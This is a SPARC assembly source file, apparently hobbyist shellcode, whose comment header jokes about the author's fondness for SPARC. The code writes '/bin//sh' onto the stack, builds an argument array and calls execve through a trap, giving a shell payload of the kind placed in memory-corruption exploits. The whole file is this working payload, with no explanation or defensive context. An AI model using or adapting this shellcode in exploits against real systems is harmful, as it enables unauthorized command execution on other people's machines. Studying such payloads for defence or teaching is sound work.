/* Standard /bin/sh code..
 * Gotta love sparc :)
 * I enjoy sparc so much, I just might do some more.
 * 
 * 0xcd80.org (No CD 80 in this code :(
 * nirosys at 0xcd80 dot org
 */

.text

.global _start

_start:
        sethi   %hi(0x2f62696e), %l0         ! "/bin"
        or      %l0, %lo(0x2f62696e), %l0
	sethi	%hi(0x2f2f7368), %l1         ! "//sh"
	or	%l1, %lo(0x2f2f7368), %l1
 	std	%l0, [%sp - 0x10]            ! "/bin//sh"
	clr	[%sp - 0x08]                 ! Null Terminate
	clr	[%sp - 0x14]	             ! Store NULL for args
	sub     %sp, 0x10, %o0               ! Grab a ptr to "/bin//sh"
	st	%o0, [%sp - 0x18]	     ! Store ptr to our cmd
	sub	%sp, 0x18, %o1               ! Grab ptr to our args
	sub	%o2, %o2, %o2                ! NULL envp
	sub     %g1, %g1, %g1                ! prepare syscall num
	mov	0x3b, %g1                    ! execve
	ta	0x08                         ! *sniff* 0xcd80? :(
